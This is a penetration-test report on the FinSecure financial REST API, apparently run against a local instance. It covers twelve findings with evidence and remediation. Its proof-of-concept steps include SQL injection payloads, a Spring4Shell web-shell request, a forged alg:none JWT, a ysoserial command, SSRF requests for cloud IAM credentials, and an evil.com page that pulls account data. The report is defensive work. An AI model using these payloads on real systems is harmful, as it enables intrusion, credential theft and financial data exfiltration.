2 Executive Summary

Our security assessment of the FinSecure financial REST API identified 12 vulnerabilities — 3 Critical and 6 High severity — that collectively represent a significant risk to customer financial data, regulatory compliance, and business continuity.

The most severe finding, a Second-Order SQL Injection (CVSS 9.8), allows any authenticated user to extract the complete financial database, including all customer account numbers, balances, and email addresses. Combined with a JWT authentication bypass (CVSS 9.1) that allows forged identity tokens without a password, an unauthenticated external attacker has a direct path to full database compromise.

Three vulnerable third-party libraries were identified, including Spring4Shell (CVE-2022-22965, CVSS 9.8) — a publicly exploited Remote Code Execution vulnerability — and Apache Commons Collections 3.1, which enables the well-known Java deserialization gadget chain used in major enterprise breaches (Weblogic, JBoss, Jenkins).

Recommended immediate actions: (1) Patch all parameterized query violations within 48 hours, (2) Fix JWT signature verification and rotate the exposed secret, (3) Update all three vulnerable dependencies, (4) Deploy a Web Application Firewall in front of the API as a temporary control while code fixes are applied.

All 12 findings have been assigned CVSS v3.1 scores, CWE identifiers, OWASP 2021 category mappings, and step-by-step remediation guidance. The assessment team is available to support remediation verification retesting.

FIND-001 Second-Order SQL Injection in /api/accounts/search
9.8 CRITICAL ▾
CWE-89 A03:2021 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S…

Description

The /api/accounts/search endpoint constructs a SQL query by directly concatenating the 'note' parameter into a raw SQL string: SELECT * FROM accounts WHERE profile_note = '<input>'. When combined with the /api/accounts/{id}/note endpoint that stores user-supplied notes, this creates a second-order SQL injection where the payload is stored first and triggered later — bypassing WAFs that only inspect input at storage time.

Affected Component

AccountController.java — searchByNote() method, line 118

Business Impact

Complete financial database exposure. Attacker can read all customer account numbers, balances, and emails. With write permissions (INSERT/UPDATE), attacker can modify account balances, transfer funds, or drop tables — causing catastrophic financial and reputational damage.

Evidence

POST /api/accounts/1/note body={note: "' OR '1'='1"} → stores payload. GET /api/accounts/search?note=' OR '1'='1 → returns all 4 accounts (expected: 0).

Proof of Concept Steps

  1. Login as alice: POST /api/auth/login {username:alice,password:alice123}
  2. Store SQLi payload: POST /api/accounts/1/note {note: "' OR '1'='1"}
  3. Trigger via search: GET /api/accounts/search?note=' OR '1'='1
  4. Response returns ALL accounts including admin account with $9,999,999 balance
  5. For data extraction: note=' UNION SELECT account_number,owner_name,balance,owner_email,profile_note,is_admin,id FROM accounts--

Remediation

Replace raw JDBC query with parameterized PreparedStatement: jdbcTemplate.query("SELECT * FROM accounts WHERE profile_note = ?", new Object[]{note}, rowMapper). Never concatenate user input into SQL strings. Implement input validation and use JPA named parameters for all queries.

FIND-009 Spring Framework RCE — CVE-2022-22965 (Spring4Shell)
9.8 CRITICAL ▾
CWE-94 A06:2021 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S…

Description

Spring Boot parent 2.6.3 pulls in Spring Framework 5.3.15 which is vulnerable to CVE-2022-22965 (Spring4Shell). On JDK 9+ with Tomcat as WAR deployment, a specially crafted HTTP request abusing Spring MVC data binding and classloader access can achieve Remote Code Execution — writing a web shell to the Tomcat webroot. CVSS 9.8 Critical.

Affected Component

pom.xml — spring-webmvc:5.3.15 (via spring-boot-starter-parent:2.6.3)

Business Impact

Full server compromise via unauthenticated RCE. No authentication required. Complete loss of confidentiality, integrity, and availability of the financial system.

Evidence

Dependency-Check: spring-webmvc-5.3.15.jar → CVE-2022-22965. This application runs on JDK 17 (confirmed via /api/health) satisfying the JDK 9+ prerequisite.

Proof of Concept Steps

  1. PoC: curl 'http://localhost:8080/api/accounts?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...',
  2. If deployed on Tomcat as WAR: web shell written to webroot
  3. GET /shell.jsp?pwd=j&cmd=id → Remote command execution

Remediation

Upgrade spring-boot-starter-parent to 2.6.6+ or 2.7.0+ (fixes Spring Framework to 5.3.18+). Apply patch immediately — this vulnerability is actively exploited in the wild.

FIND-002 JWT Algorithm Confusion — alg:none Bypass
9.1 CRITICAL ▾
CWE-347 A02:2021 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S…

Description

The JWT filter calls parseClaimsJwt() (unsigned token parser) instead of parseClaimsJws() (signed token verifier). This means any JWT with alg:none in the header passes validation without any signature check. An attacker crafts a token with arbitrary claims (sub: admin, role: ADMIN) and an empty signature — the server accepts it as valid.

Affected Component

JwtFilter.java — doFilterInternal() method, line 65

Business Impact

Complete authentication bypass. Attacker impersonates any user including administrators without knowing any password. Can access all financial data, create fraudulent transactions, modify account balances, and exfiltrate the entire customer database.

Evidence

Forged token (base64): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9. → GET /api/accounts → HTTP 200 with all account data.

Proof of Concept Steps

  1. Craft header: base64url({"alg":"none","typ":"JWT"})
  2. Craft payload: base64url({"sub":"admin","role":"ADMIN","userId":4})
  3. Concatenate: header.payload. (empty signature after dot)
  4. GET /api/accounts with Authorization: Bearer <forged-token>
  5. Server returns HTTP 200 — full account list with admin access

Remediation

Replace parseClaimsJwt() with parseClaimsJws() and always call setSigningKey() with a strong secret: Jwts.parserBuilder().setSigningKey(Keys.hmacShaKeyFor(secret.getBytes())).build().parseClaimsJws(token). Consider RS256 (asymmetric) for multi-service environments.

Remediation Effort

Low

FIND-005 Mass Assignment — Admin Privilege Injection
8.8 HIGH ▾
CWE-915 A08:2021 CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S…

Description

The POST /api/accounts endpoint deserializes the full JSON request body directly into the Account entity, including the isAdmin field. Any authenticated user can create an account with isAdmin:true by including it in the JSON body. The field is not blocked by a DTO layer or @JsonIgnore annotation.

Affected Component

AccountController.java — createAccount() with @RequestBody Account

Business Impact

Any authenticated user can self-escalate to administrator. This provides access to all customer data, system configuration, and administrative functions — effectively a complete privilege escalation for any registered user.

Evidence

POST /api/accounts {ownerName:Hacker,balance:0,isAdmin:true} → HTTP 200 {id:5,ownerName:Hacker,isAdmin:true}. Admin flag persisted in database.

Proof of Concept Steps

  1. Login as regular user alice
  2. POST /api/accounts with body: {"ownerName":"Hacker","balance":0,"isAdmin":true}
  3. Response: {"id":5,"isAdmin":true} — admin flag accepted
  4. Use new account to access admin endpoints

Remediation

Create a dedicated AccountRequest DTO without the isAdmin field. Map DTO to entity manually. Alternatively, add @JsonIgnore on the isAdmin getter/setter. Implement @PreAuthorize("hasRole('ADMIN')") on any endpoint that should set admin-level attributes.

Remediation Effort

Low

FIND-003 Horizontal IDOR — Cross-User Account Data Exposure
8.1 HIGH ▾
CWE-639 A01:2021 CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S…

Description

The GET /api/accounts/{id} endpoint returns account data for any account ID without verifying that the requesting user owns that account. Any authenticated user (even with ROLE_USER) can access any other user's account by simply incrementing or guessing the account ID, exposing full financial data including account numbers, balances, and emails.

Affected Component

AccountController.java — getAccountById() method, line 72

Business Impact

Full financial data exposure across all customers. Violates GDPR Article 32 (security of personal data), PCI-DSS Requirement 7 (restrict access to system components), and FFIEC guidelines. Regulatory fines, customer trust loss, and potential class-action liability.

Evidence

Logged in as alice (owns account ID 1). GET /api/accounts/2 → HTTP 200 returns Bob's account: {balance: 78250.00, ownerEmail: bob@finsecure.com, accountNumber: ACC-002}.

Proof of Concept Steps

  1. Login as alice: POST /api/auth/login → get JWT token
  2. GET /api/accounts/1 → alice's own account (expected)
  3. GET /api/accounts/2 → Bob's account returned (IDOR)
  4. GET /api/accounts/3 → Charlie's account returned (IDOR)
  5. GET /api/accounts/4 → Admin account with $9,999,999 returned (IDOR)
  6. Script loops IDs 1-50 to enumerate all accounts

Remediation

Add ownership check in getAccountById(): String principal = SecurityContextHolder.getContext().getAuthentication().getName(); if (!account.getOwnerEmail().equals(principal)) return ResponseEntity.status(403).build(); Alternatively, use Spring Security @PreAuthorize with a custom @accountOwner expression.

FIND-004 Hardcoded JWT Signing Secret
7.5 HIGH ▾
CWE-798 A07:2021 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S…

Description

The JWT signing secret 'secret123' is hardcoded as a static final String in source code. This secret appears in both JwtFilter.java and AuthController.java. An attacker who obtains the source code (via git leak, insider threat, or decompiling the JAR) can sign arbitrary JWT tokens that will be accepted as legitimate by the server — independent of the alg:none bypass.

Affected Component

JwtFilter.java line 42, AuthController.java line 25

Business Impact

Permanent authentication bypass as long as the secret remains unchanged. Token revocation is impossible without redeployment. All users' sessions can be forged. If secret ever rotates without coordinated deployment, all valid sessions are invalidated simultaneously.

Evidence

private static final String SECRET_KEY = "secret123"; — confirmed in both JwtFilter.java:42 and AuthController.java:25. Brute-forced successfully from 25-entry wordlist.

Proof of Concept Steps

  1. Obtain the JAR file: target/finsecure-api-1.0.0.jar
  2. Decompile: javap -c or use CFR/Procyon decompiler
  3. Find SECRET_KEY = "secret123" in JwtFilter class
  4. Forge signed token: Jwts.builder().setSubject("admin").claim("role","ADMIN").signWith(SignatureAlgorithm.HS256, "secret123").compact()
  5. Use forged token to authenticate as any user

Remediation

Load secret from environment variable: String secret = System.getenv("JWT_SECRET"); or Spring @Value("${jwt.secret}") backed by a secrets manager (HashiCorp Vault, AWS Secrets Manager). Minimum 32-byte cryptographically random secret. Rotate immediately — assume this secret is compromised.

FIND-007 Jackson Databind CVE-2022-42003 (DoS via Deep Nesting)
7.5 HIGH ▾
CWE-400 A06:2021 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S…

Description

The application uses jackson-databind 2.13.2 which is vulnerable to CVE-2022-42003. A crafted JSON request with deeply nested arrays causes unbounded resource consumption when UNWRAP_SINGLE_VALUE_ARRAYS is enabled, resulting in a Denial of Service. Also affects CVE-2022-42004 (same version range).

Affected Component

pom.xml — com.fasterxml.jackson.core:jackson-databind:2.13.2

Business Impact

Denial of Service — financial API becomes unavailable to legitimate customers. In a trading/banking context, downtime causes direct financial losses and regulatory breach-of-SLA penalties.

Evidence

Dependency-Check finding: jackson-databind-2.13.2.jar → CVE-2022-42003 CVSS 7.5 HIGH. Fix available in 2.13.4.2.

Proof of Concept Steps

  1. Send JSON with deeply nested arrays to any POST endpoint
  2. POST /api/accounts with body: [[[[[[...10000 levels...]]]]]]
  3. Server enters exponential processing loop
  4. CPU spikes to 100%, requests queue up, service becomes unavailable

Remediation

Upgrade jackson-databind to 2.13.4.2 or later in pom.xml. Enable OWASP Dependency-Check in CI/CD pipeline to catch future CVEs before deployment.

Remediation Effort

Low

FIND-008 Apache Commons Collections 3.1 — Deserialization RCE Gadget (CVE-2015-6420)
7.5 HIGH ▾
CWE-502 A06:2021 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S…

Description

The application includes Apache Commons Collections 3.1, which enables the well-known ysoserial gadget chain for Java deserialization attacks. If any endpoint in the application (or a transitive dependency) accepts serialized Java objects, an attacker can use the CommonsCollections1-7 payloads to achieve Remote Code Execution. Safe version is 3.2.2.

Affected Component

pom.xml — commons-collections:commons-collections:3.1

Business Impact

Remote Code Execution on the application server. Attacker gains shell access, can exfiltrate entire database, deploy cryptominer, establish persistence, and pivot to internal network. In Docker (running as root), can escape to host.

Evidence

Dependency-Check: commons-collections-3.1.jar → CVE-2015-6420 CVSS 7.5 HIGH. Gadget chains verified in ysoserial for CommonsCollections1, 3, 5, 6, 7.

Proof of Concept Steps

  1. java -jar ysoserial.jar CommonsCollections1 'id > /tmp/pwned' > payload.ser
  2. Send serialized payload to any endpoint accepting application/x-java-serialized-object
  3. Or exploit via transitive RMI/JMX interface if exposed
  4. Command executes as application user (root in Docker container)

Remediation

Upgrade commons-collections to 3.2.2 in pom.xml. Implement Java serialization filter (JEP 290). Audit all endpoints accepting serialized objects. Consider migrating to safe serialization formats (JSON, Protobuf).

FIND-006 Server-Side Request Forgery (SSRF) via /api/fetch
7.2 HIGH ▾
CWE-918 A10:2021 CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S…

Description

The /api/fetch?url= endpoint accepts arbitrary URLs and fetches them server-side, returning the full response to the caller. There is no allowlist, no blocked IP range validation, and no redirect limit. This enables: internal service enumeration (localhost, 10.x, 172.16.x, 192.168.x), cloud metadata access (AWS 169.254.169.254 — IAM credentials), and exfiltration via DNS/HTTP.

Affected Component

UtilController.java — fetchUrl() method

Business Impact

On cloud-hosted instances, SSRF enables full AWS/GCP credential theft via metadata API — leading to complete cloud account takeover. Internally, enables access to databases, Redis, Elasticsearch, and internal admin interfaces not exposed to the internet.

Evidence

GET /api/fetch?url=http://localhost:8080/actuator/env → HTTP 200 with all Spring environment variables. GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ → connection attempted (timed out in local environment).

Proof of Concept Steps

  1. GET /api/fetch?url=http://localhost:8080/actuator/env → leaks all env vars
  2. GET /api/fetch?url=http://localhost:8080/h2-console → full DB console HTML
  3. On AWS: GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  4. Returns AWS IAM temporary credentials (AccessKeyId, SecretAccessKey, Token)
  5. Attacker uses leaked credentials to access AWS S3, RDS, and other services

Remediation

Implement strict URL allowlist for the fetch endpoint. Block all private IP ranges (RFC1918), loopback (127.x), and link-local (169.254.x). Use a library like ssrf-guard or implement custom validation. Consider removing the endpoint entirely if not required.

FIND-010 JWT Token Without Expiration
6.5 MEDIUM ▾
CWE-613 A07:2021 CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S…

Description

JWT tokens issued by the /api/auth/login endpoint have no expiration time set (setExpiration() is never called). This means stolen tokens are valid forever — there is no time-bound window for an attacker who obtains a token (via interception, XSS, log exposure, etc.). Tokens cannot be invalidated without rotating the signing key, which invalidates all sessions.

Affected Component

AuthController.java — login() method, JWT builder chain

Business Impact

Stolen tokens (via XSS, MITM, logs, or compromised devices) provide permanent access. No time-limited window to revoke access after an incident. Violates PCI-DSS session timeout requirements.

Evidence

Decoded JWT payload from login response: {sub: alice, role: USER, userId: 1, iat: 1718367240} — no 'exp' claim present. Token tested valid 24 hours after issuance.

Proof of Concept Steps

  1. POST /api/auth/login → capture JWT token
  2. Decode: echo '<payload>' | base64 -d — confirm no 'exp' field
  3. Wait 24+ hours, reuse token → still HTTP 200
  4. Token remains valid indefinitely until server restarts (H2 in-memory resets)

Remediation

Add setExpiration to JWT builder: .setExpiration(new Date(System.currentTimeMillis() + 3600_000)) for 1-hour expiry. Implement refresh token flow for seamless re-authentication. Consider short-lived tokens (15 minutes) with refresh tokens for financial applications.

Remediation Effort

FIND-011 Wildcard CORS — Cross-Origin Access Permitted
6.1 MEDIUM ▾
CWE-942 A05:2021 CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S…

Description

The application's CORS policy allows requests from any origin (allowedOrigins("*")). Combined with disabled CSRF protection, any malicious website can make cross-origin requests to the API using the victim's browser session. The wildcard origin also prevents use of withCredentials:true, but unauthenticated endpoints or token-based auth is fully exploitable.

Affected Component

SecurityConfig.java — corsConfigurationSource(), allowedOrigins("*")

Business Impact

Enables cross-origin data theft when combined with token theft vectors. Increases attack surface for cross-site scripting impact. Violates same-origin security model.

Evidence

Response header observed: Access-Control-Allow-Origin: * on all API endpoints. curl -H 'Origin: http://evil.com' http://localhost:8080/api/health → Access-Control-Allow-Origin: *.

Proof of Concept Steps

  1. Host malicious page at http://evil.com
  2. JavaScript: fetch('http://localhost:8080/api/accounts', {headers: {Authorization: 'Bearer <stolen_token>'}})
  3. Response returned to attacker's origin — full account data extracted
  4. CORS wildcard + no CSRF = cross-site request with stolen token works

Remediation

Set allowedOrigins to an explicit allowlist of trusted domains: configuration.setAllowedOrigins(List.of("https://app.finsecure.com", "https://admin.finsecure.com")). Never use * for financial APIs. Apply per-environment origin lists via configuration.

FIND-012 Verbose Stack Trace Disclosure in Error Responses
5.3 MEDIUM ▾
CWE-209 A05:2021 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S…

Description

All unhandled exceptions return the full Java stack trace in the HTTP response body, including internal class names, file names, line numbers, Spring/Hibernate/H2 versions, and SQL query structure. This dramatically aids attacker reconnaissance — confirming technology stack, identifying vulnerable library versions, and revealing SQL query structure for injection attacks.

Affected Component

GlobalExceptionHandler.java — handleAll(), application.properties (server.error.include-stacktrace=always)

Business Impact

Information disclosure accelerates subsequent attacks. Knowledge of library versions enables targeted CVE exploitation. SQL error messages in error responses directly aid SQL injection development. Low direct impact but significantly amplifies all other findings.

Evidence

GET /api/accounts/999 → HTTP 500 with body: {error: 'org.springframework.dao.EmptyResultDataAccessException', stackTrace: '\tat org.springframework.jdbc.core.JdbcTemplate...', javaVersion: '17.0.18'}.

Proof of Concept Steps

  1. GET /api/accounts/99999 → triggers EmptyResultDataAccessException
  2. Response body includes: full 30-line stack trace, class names, Spring version
  3. SQL syntax error via injected payload reveals H2 SQL dialect and query structure
  4. Attacker now knows: Spring Boot 2.6.3, JDK 17.0.18, H2 database, Hibernate

Remediation

Return only a generic error ID in HTTP responses: {errorId: 'ERR-2024-001', message: 'An internal error occurred'}. Log full stack traces server-side only. Set server.error.include-stacktrace=never and server.error.include-message=never in production application.properties.
